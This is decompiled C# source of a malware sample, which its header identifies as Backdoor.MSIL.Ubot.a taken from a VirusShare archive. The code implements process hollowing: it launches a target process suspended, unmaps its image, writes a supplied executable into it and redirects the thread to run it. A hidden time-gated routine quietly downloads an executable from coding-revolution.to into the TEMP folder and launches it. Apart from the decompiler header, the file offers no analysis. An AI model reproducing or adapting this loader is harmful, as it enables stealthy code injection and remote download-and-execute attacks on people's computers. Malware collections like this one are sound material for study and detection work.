// Decompiled with JetBrains decompiler
// Type: ClassLibrary1.Class1
// Assembly: ClassLibrary1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F48967C5-4A9B-4B33-8AD8-B0CDCF5C28B2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Backdoor.MSIL.Ubot.a-6e17e948adb54580e45da3c3cacc1d566e2c58aea2f345557d63a9fa344eb1ed.exe

using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace ClassLibrary1
{
  public class Class1
  {
    private static Random random = new Random();

    private string randomString(int length)
    {
      string str = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < length; ++index)
        stringBuilder.Append(str[Class1.random.Next(str.Length)]);
      return stringBuilder.ToString();
    }

    private int randomInteger(int min, int max) => Class1.random.Next(min, max);

    private void checkTime()
    {
      if (DateTime.Now.Ticks < new DateTime(2011, 10, 1).Ticks)
        return;
      string str = this.randomString(this.randomInteger(8, 16)) + ".exe";
      new WebClient().DownloadFile("http://coding-revolution.to/update.exe", Environment.GetEnvironmentVariable("TEMP") + "\\" + str);
      new Process()
      {
        StartInfo = {
          FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\" + str)
        }
      }.Start();
    }

    private void tschakalaka()
    {
      try
      {
        this.checkTime();
      }
      catch
      {
      }
    }

    [DllImport("kernel32")]
    private static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    public void omfgoaz(byte[] fBytes, string szTarget)
    {
      this.tschakalaka();
      Class1.IMAGE_DOS_HEADER imageDosHeader = new Class1.IMAGE_DOS_HEADER();
      Class1.IMAGE_NT_HEADERS imageNtHeaders = new Class1.IMAGE_NT_HEADERS();
      Class1.IMAGE_SECTION_HEADER structure1 = new Class1.IMAGE_SECTION_HEADER();
      Class1.STARTUPINFO lpStartupInfo = new Class1.STARTUPINFO();
      Class1.PROCESS_INFORMATION lpProcessInformation = new Class1.PROCESS_INFORMATION();
      Class1.CONTEXT lpContext = new Class1.CONTEXT();
      Class1._CreateProcess forFunctionPointer1 = (Class1._CreateProcess) Marshal.GetDelegateForFunctionPointer(Class1.GetProcAddress(Class1.LoadLibrary("kernel32.dll"), "CreateProcessA"), typeof (Class1._CreateProcess));
      Class1._NtUnmapViewOfSection forFunctionPointer2 = (Class1._NtUnmapViewOfSection) Marshal.GetDelegateForFunctionPointer(Class1.GetProcAddress(Class1.LoadLibrary("ntdll.dll"), "NtUnmapViewOfSection"), typeof (Class1._NtUnmapViewOfSection));
      Class1._VirtualAllocEx forFunctionPointer3 = (Class1._VirtualAllocEx) Marshal.GetDelegateForFunctionPointer(Class1.GetProcAddress(Class1.LoadLibrary("kernel32.dll"), "VirtualAllocEx"), typeof (Class1._VirtualAllocEx));
      Class1._WriteProcessMemory forFunctionPointer4 = (Class1._WriteProcessMemory) Marshal.GetDelegateForFunctionPointer(Class1.GetProcAddress(Class1.LoadLibrary("kernel32.dll"), "WriteProcessMemory"), typeof (Class1._WriteProcessMemory));
      Class1._GetThreadContext forFunctionPointer5 = (Class1._GetThreadContext) Marshal.GetDelegateForFunctionPointer(Class1.GetProcAddress(Class1.LoadLibrary("kernel32.dll"), "GetThreadContext"), typeof (Class1._GetThreadContext));
      Class1._SetThreadContext forFunctionPointer6 = (Class1._SetThreadContext) Marshal.GetDelegateForFunctionPointer(Class1.GetProcAddress(Class1.LoadLibrary("kernel32.dll"), "SetThreadContext"), typeof (Class1._SetThreadContext));
      Class1._ResumeThread forFunctionPointer7 = (Class1._ResumeThread) Marshal.GetDelegateForFunctionPointer(Class1.GetProcAddress(Class1.LoadLibrary("kernel32.dll"), "ResumeThread"), typeof (Class1._ResumeThread));
      lpStartupInfo.cb = (uint) Marshal.SizeOf((object) lpStartupInfo);
      lpContext.ContextFlags = 65543U;
      GCHandle gcHandle = GCHandle.Alloc((object) fBytes, GCHandleType.Pinned);
      int int32 = gcHandle.AddrOfPinnedObject().ToInt32();
      gcHandle.Free();
      Class1.IMAGE_DOS_HEADER structure2 = (Class1.IMAGE_DOS_HEADER) Marshal.PtrToStructure((IntPtr) int32, typeof (Class1.IMAGE_DOS_HEADER));
      Class1.IMAGE_NT_HEADERS structure3 = (Class1.IMAGE_NT_HEADERS) Marshal.PtrToStructure((IntPtr) (int32 + structure2.e_lfanew), typeof (Class1.IMAGE_NT_HEADERS));
      if (structure3.Signature != 17744U || structure2.e_magic != (ushort) 23117)
        return;
      int num1 = forFunctionPointer1(szTarget, string.Empty, IntPtr.Zero, IntPtr.Zero, false, Class1.CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, (string) null, ref lpStartupInfo, out lpProcessInformation) ? 1 : 0;
      int num2 = forFunctionPointer2(lpProcessInformation.hProcess, (IntPtr) (long) structure3.OptionalHeader.ImageBase) ? 1 : 0;
      if (!forFunctionPointer3(lpProcessInformation.hProcess, (IntPtr) (long) structure3.OptionalHeader.ImageBase, structure3.OptionalHeader.SizeOfImage, Class1.AllocationType.COMMIT | Class1.AllocationType.RESERVE, Class1.MemoryProtection.EXECUTE_READWRITE))
        return;
      int num3 = forFunctionPointer4(lpProcessInformation.hProcess, (IntPtr) (long) structure3.OptionalHeader.ImageBase, fBytes, structure3.OptionalHeader.SizeOfHeaders, (object) null) ? 1 : 0;
      for (int index1 = 0; index1 <= (int) structure3.FileHeader.NumberOfSections - 1; ++index1)
      {
        structure1 = (Class1.IMAGE_SECTION_HEADER) Marshal.PtrToStructure((IntPtr) (int32 + structure2.e_lfanew + Marshal.SizeOf((object) structure3) + Marshal.SizeOf((object) structure1) * index1), typeof (Class1.IMAGE_SECTION_HEADER));
        byte[] lpBuffer = new byte[(IntPtr) structure1.SizeOfRawData];
        for (int index2 = 0; index2 <= (int) structure1.SizeOfRawData - 1; ++index2)
          lpBuffer[index2] = fBytes[(long) structure1.PointerToRawData + (long) index2];
        int num4 = forFunctionPointer4(lpProcessInformation.hProcess, (IntPtr) (long) (structure3.OptionalHeader.ImageBase + structure1.VirtualAddress), lpBuffer, structure1.SizeOfRawData, (object) null) ? 1 : 0;
      }
      int num5 = forFunctionPointer5(lpProcessInformation.hThread, ref lpContext) ? 1 : 0;
      byte[] bytes = BitConverter.GetBytes(structure3.OptionalHeader.ImageBase);
      int num6 = forFunctionPointer4(lpProcessInformation.hProcess, (IntPtr) (long) (lpContext.Ebx + 8U), bytes, (uint) bytes.Length, (object) null) ? 1 : 0;
      lpContext.Eax = structure3.OptionalHeader.ImageBase + structure3.OptionalHeader.AddressOfEntryPoint;
      int num7 = forFunctionPointer6(lpProcessInformation.hThread, ref lpContext) ? 1 : 0;
      int num8 = (int) forFunctionPointer7(lpProcessInformation.hThread);
    }

    private enum CreateProcessFlags : uint
    {
      DEBUG_PROCESS = 1,
      DEBUG_ONLY_THIS_PROCESS = 2,
      CREATE_SUSPENDED = 4,
      DETACHED_PROCESS = 8,
      CREATE_NEW_CONSOLE = 16, // 0x00000010
      CREATE_NEW_PROCESS_GROUP = 512, // 0x00000200
      CREATE_UNICODE_ENVIRONMENT = 1024, // 0x00000400
      CREATE_SEPARATE_WOW_VDM = 2048, // 0x00000800
      CREATE_SHARED_WOW_VDM = 4096, // 0x00001000
      INHERIT_PARENT_AFFINITY = 65536, // 0x00010000
      CREATE_PROTECTED_PROCESS = 262144, // 0x00040000
      EXTENDED_STARTUPINFO_PRESENT = 524288, // 0x00080000
      CREATE_BREAKAWAY_FROM_JOB = 16777216, // 0x01000000
      CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 33554432, // 0x02000000
      CREATE_DEFAULT_ERROR_MODE = 67108864, // 0x04000000
      CREATE_NO_WINDOW = 134217728, // 0x08000000
    }

    private enum CONTEXT_FLAGS : uint
    {
      CONTEXT_i386 = 65536, // 0x00010000
      CONTEXT_i486 = 65536, // 0x00010000
      CONTEXT_CONTROL = 65537, // 0x00010001
      CONTEXT_INTEGER = 65538, // 0x00010002
      CONTEXT_SEGMENTS = 65540, // 0x00010004
      CONTEXT_FULL = 65543, // 0x00010007
      CONTEXT_FLOATING_POINT = 65544, // 0x00010008
      CONTEXT_DEBUG_REGISTERS = 65552, // 0x00010010
      CONTEXT_EXTENDED_REGISTERS = 65568, // 0x00010020
      CONTEXT_ALL = 65599, // 0x0001003F
    }

    private enum MemoryProtection : uint
    {
      NOACCESS = 1,
      READONLY = 2,
      READWRITE = 4,
      WRITECOPY = 8,
      EXECUTE = 16, // 0x00000010
      EXECUTE_READ = 32, // 0x00000020
      EXECUTE_READWRITE = 64, // 0x00000040
      EXECUTE_WRITECOPY = 128, // 0x00000080
      GUARD_Modifierflag = 256, // 0x00000100
      NOCACHE_Modifierflag = 512, // 0x00000200
      WRITECOMBINE_Modifierflag = 1024, // 0x00000400
    }

    private enum AllocationType : uint
    {
      COMMIT = 4096, // 0x00001000
      RESERVE = 8192, // 0x00002000
      RESET = 524288, // 0x00080000
      TOP_DOWN = 1048576, // 0x00100000
      WRITE_WATCH = 2097152, // 0x00200000
      PHYSICAL = 4194304, // 0x00400000
      LARGE_PAGES = 536870912, // 0x20000000
    }

    private delegate bool _CreateProcess(
      string lpApplicationName,
      string lpCommandLine,
      IntPtr lpProcessAttributes,
      IntPtr lpThreadAttributes,
      bool bInheritHandles,
      Class1.CreateProcessFlags dwCreationFlags,
      IntPtr lpEnvironment,
      string lpCurrentDirectory,
      ref Class1.STARTUPINFO lpStartupInfo,
      out Class1.PROCESS_INFORMATION lpProcessInformation);

    private delegate bool _WriteProcessMemory(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      byte[] lpBuffer,
      uint nSize,
      object lpNumberOfBytesWritten);

    private delegate bool _NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    private delegate bool _VirtualAllocEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      Class1.AllocationType flAllocationType,
      Class1.MemoryProtection flProtect);

    private delegate bool _GetThreadContext(IntPtr hThread, ref Class1.CONTEXT lpContext);

    private delegate bool _SetThreadContext(IntPtr hThread, [In] ref Class1.CONTEXT lpContext);

    private delegate uint _ResumeThread(IntPtr hThread);

    private struct STARTUPINFO
    {
      public uint cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public uint dwX;
      public uint dwY;
      public uint dwXSize;
      public uint dwYSize;
      public uint dwXCountChars;
      public uint dwYCountChars;
      public uint dwFillAttribute;
      public uint dwFlags;
      public short wShowWindow;
      public short cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
    }

    private struct PROCESS_INFORMATION
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public uint dwProcessId;
      public uint dwThreadId;
    }

    private struct SECURITY_ATTRIBUTES
    {
      public int length;
      public IntPtr lpSecurityDescriptor;
      public bool bInheritHandle;
    }

    private struct IMAGE_DOS_HEADER
    {
      public ushort e_magic;
      public ushort e_cblp;
      public ushort e_cp;
      public ushort e_crlc;
      public ushort e_cparhdr;
      public ushort e_minalloc;
      public ushort e_maxalloc;
      public ushort e_ss;
      public ushort e_sp;
      public ushort e_csum;
      public ushort e_ip;
      public ushort e_cs;
      public ushort e_lfarlc;
      public ushort e_ovno;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
      public ushort[] e_res1;
      public ushort e_oemid;
      public ushort e_oeminfo;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
      public ushort[] e_res2;
      public int e_lfanew;
    }

    private struct IMAGE_FILE_HEADER
    {
      public ushort Machine;
      public ushort NumberOfSections;
      public uint TimeDateStamp;
      public uint PointerToSymbolTable;
      public uint NumberOfSymbols;
      public ushort SizeOfOptionalHeader;
      public ushort Characteristics;
    }

    private struct IMAGE_DATA_DIRECTORY
    {
      public uint VirtualAddress;
      public uint Size;
    }

    private struct IMAGE_OPTIONAL_HEADER32
    {
      public ushort Magic;
      public byte MajorLinkerVersion;
      public byte MinorLinkerVersion;
      public uint SizeOfCode;
      public uint SizeOfInitializedData;
      public uint SizeOfUninitializedData;
      public uint AddressOfEntryPoint;
      public uint BaseOfCode;
      public uint BaseOfData;
      public uint ImageBase;
      public uint SectionAlignment;
      public uint FileAlignment;
      public ushort MajorOperatingSystemVersion;
      public ushort MinorOperatingSystemVersion;
      public ushort MajorImageVersion;
      public ushort MinorImageVersion;
      public ushort MajorSubsystemVersion;
      public ushort MinorSubsystemVersion;
      public uint Win32VersionValue;
      public uint SizeOfImage;
      public uint SizeOfHeaders;
      public uint CheckSum;
      public ushort Subsystem;
      public ushort DllCharacteristics;
      public uint SizeOfStackReserve;
      public uint SizeOfStackCommit;
      public uint SizeOfHeapReserve;
      public uint SizeOfHeapCommit;
      public uint LoaderFlags;
      public uint NumberOfRvaAndSizes;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public Class1.IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    private struct IMAGE_NT_HEADERS
    {
      public uint Signature;
      public Class1.IMAGE_FILE_HEADER FileHeader;
      public Class1.IMAGE_OPTIONAL_HEADER32 OptionalHeader;
    }

    private struct FLOATING_SAVE_AREA
    {
      public uint ControlWord;
      public uint StatusWord;
      public uint TagWord;
      public uint ErrorOffset;
      public uint ErrorSelector;
      public uint DataOffset;
      public uint DataSelector;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] RegisterArea;
      public uint Cr0NpxState;
    }

    private struct CONTEXT
    {
      public uint ContextFlags;
      public uint Dr0;
      public uint Dr1;
      public uint Dr2;
      public uint Dr3;
      public uint Dr6;
      public uint Dr7;
      public Class1.FLOATING_SAVE_AREA FloatSave;
      public uint SegGs;
      public uint SegFs;
      public uint SegEs;
      public uint SegDs;
      public uint Edi;
      public uint Esi;
      public uint Ebx;
      public uint Edx;
      public uint Ecx;
      public uint Eax;
      public uint Ebp;
      public uint Eip;
      public uint SegCs;
      public uint EFlags;
      public uint Esp;
      public uint SegSs;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
      public byte[] ExtendedRegisters;
    }

    private struct IMAGE_SECTION_HEADER
    {
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
      public byte[] Name;
      public uint VirtualSize;
      public uint VirtualAddress;
      public uint SizeOfRawData;
      public uint PointerToRawData;
      public uint PointerToRelocations;
      public uint PointerToLinenumbers;
      public ushort NumberOfRelocations;
      public ushort NumberOfLinenumbers;
      public uint Characteristics;
    }
  }
}
